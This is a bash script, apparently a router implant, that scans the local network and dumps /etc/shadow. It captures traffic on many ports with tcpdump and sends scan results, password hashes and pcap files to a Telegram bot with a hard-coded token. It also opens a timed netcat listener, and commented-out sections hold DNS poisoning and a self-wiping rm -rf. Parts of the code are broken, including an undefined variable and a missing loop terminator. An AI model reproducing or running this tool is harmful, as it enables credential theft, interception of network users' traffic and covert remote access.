#!/bin/bash
wget -q --spider http://google.com
current_date=$(date "+%d-%m-%Y")
if [ $? -eq 0 ]; then
	# Send report via telegram
	token="5506183591:AAEL6myAZ8xZcVsMDzDx6Fgz6gUhTWo-pMk"
	# chat id
	chat_id="1789487661"

	echo "Internet ok"
	
	# Installing dependencies
	echo "Install dependencies"
	opkg update
	opkg install nmap-full
	opkg install curl
	opkg install tcpdump
	echo "Dependencies ok"
	sleep 1
	
	# Create a file to save results
	echo "Start scanning..."
	nmap_output_file="nmap_scan_$current_date.txt"
	touch $nmap_output_file
	ip_address=$(ip addr show wlan0 | grep 'inet ' | awk '{print $2}' | cut -d '/' -f 1)	
	#Start scanning
	nmap -sS -O -sV $ip_address/24 >> $nmap_output_file
	echo "Scanning complete"
	
	# Get public IP
	public_ip=$(curl -s https://ifconfig.me/ip)
	echo "Public ip: $public_ip"

	# Get system info
	system_info=$(uname -a)

	# Get ifconfig result
	ifconfig_output_file="ifconfig_$current_date.txt"
	touch $ifconfig_output_file
	ifconfig > $ifconfig_output_file

	#Port forwarding
	#f_port=3000
	#echo "Enabling portforwarding on port $f_port..."
	#iptables -A INPUT -p tcp --dport $f_port -j ACCEPT
	#curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Public ip: $public_ip %0ASystem info: $system_info %0APort forwading enabled: $public_ip":"$f_port"		

	#DNS poisoning
	#domain="example.com"
	#ip_server="192.168.1.100"
	#edit dnsmasq.conf
	#echo "address=/$domain/$ip_server" >> /etc/dnsmasq.conf
	# restart dnsmasq
	#systemctl restart dnsmasq
	#curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Redirection completed successfully: $domain -> $ip_server"

	#Session controll
	#sessions=$(who | awk '{print $1 " " $2 " " $5}' | grep "root")
	#ount=$(echo "$sessions" | wc -l)
	#if [ "$count" -ge 2 ]; then
	    #curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Warning: $count sessions %0AAutoremove"
	    #rm -rf ./*
	#fi
	
	#Send report
	filepath1=$nmap_output_file
	filepath3=$ifconfig_output_file
	curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Public ip: $public_ip %0ASystem info: $system_info"
	curl -F chat_id="$chat_id" -F document=@"$filepath1" "https://api.telegram.org/bot$token/sendDocument"
	curl -F chat_id="$chat_id" -F document=@"$filepath3" "https://api.telegram.org/bot$token/sendDocument"
	rm "$filepath1"
	rm "$filepath3"

	#Dump /etc/shadow file
	result_shadow="result_shadow_$public_ip.txt"
	touch $result_shadow
	cat /etc/shadow > $result_shadow
	curl -F chat_id="$chat_id" -F document=@"$result_shadow" "https://api.telegram.org/bot$token/sendDocument"
	rm "$result_shadow"
	h=$(date +"%H:%M")
	
	#Remote Shell enabled for 30 minutes
	h=$(date +"%H:%M")
	port=4000
	start="14:00"
	if [ "$h" == $start ]; then
		echo "Enabling portforwarding on port $port..."
        iptables -A INPUT -p tcp --dport $port -j ACCEPT
        echo "Start listening..."
        nc -l -p $port
        #send notification
		curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Start listening: $public_ip":"$port"
        while [ "$h" != "$stop" ];
        do
        	echo "Listening..."
            sleep 1
            h=$(date +"%H:%M")
        done
    else
       	echo "Stop portforwarding on port $port..."
        iptables -A INPUT -p tcp --dport $port -j DROP
        curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Stop listening: $public_ip":"$port"
    fi
	
	#Identify new host
	wifi_interface="wlan0"
	#gets the list of all available network interfaces and filters only the Ethernet ones
	ethernet_interfaces=$(ip link | awk -F: '$0 !~ "lo|vir|wl|^[^0-9]"{print $2}')
	#bbtains MAC addresses from the specified network interfaces
	get_mac_addresses() {
	  arp -a | awk '{print $4}' | sort -u
	}
	#stores currently known MAC addresses
	known_macs=$(get_mac_addresses)
	while true; do
		#gets the currently detected MAC addresses for all Ethernet interfaces
		current_macs=$(for interface in $ethernet_interfaces; do
		                   ip neigh show dev $interface | awk '{print $5}'
		              done | sort -u)
		#compares currently detected MAC addresses with known MAC addresses
		new_macs=$(comm -13 <(echo "$known_macs") <(echo "$current_macs"))
		#if there are new MAC addresses, it prints a message
		if [ -n "$new_macs" ]; then
			curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="New macs: $new_macs"
		    #update known MAC addresses
		    known_macs="$current_macs"
		fi

		#Intercept traffic
		echo "Start intercepting..."
		#max size of file .pcap
		MAX_FILE_SIZE=200000000  # 200MB in byte
		#name of file 
		tcpdump_output_file="intercept$current_date.pcap"
		#filter to apply at tcpdump
		filter_tcpdump="(tcp port 25 or tcp port 80 or tcp port 8080 or tcp port 443 or tcp port 445 or tcp port 137 or tcp port 139 or tcp port 21 or tcp port 23 or udp port 69 or udp portrange 10000-20000)"
		#start tcpdump to capture traffic and save all on file .pcap
		tcpdump -i any -s 0 -w "$tcpdump_output_file" "$filter_tcpdump" &
		#save PID of tcpdump process
		tcpdump_pid=$!
		#cicle while to check size of file .pcap
		while true; do
		    #obtain current size of file .pcap
		    FILE_SIZE=$(stat -c%s "$tcpdump_output_file")
		    #if the size > 200mb stop tcpdump process 
		    if [ "$FILE_SIZE" -ge "$MAX_FILE_SIZE" ]; then
		        kill -SIGINT "$tcpdump_pid"
		        break
		    fi
		    #else wait 1 second before to check size of file .pcap
		    sleep 1
		done
		filepath2=$tcpdump_output_file
		#send file via telegram
		curl -F chat_id="$chat_id" -F document=@"$filepath2" "https://api.telegram.org/bot$token/sendDocument"
		rm "$filepath2"
	continue
else
  	echo "Internet not ok"
fi

